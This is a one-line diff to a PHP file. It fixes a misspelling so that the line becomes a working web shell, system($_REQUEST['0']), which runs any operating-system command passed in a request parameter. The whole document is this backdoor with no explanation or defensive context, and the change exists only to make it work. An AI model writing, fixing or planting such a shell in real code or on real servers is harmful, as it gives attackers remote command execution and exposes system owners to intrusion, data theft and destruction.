@@ -1,1 +1,1 @@
-<?php system($_REQQUEST['0']);?>
+<?php system($_REQUEST['0']);?>
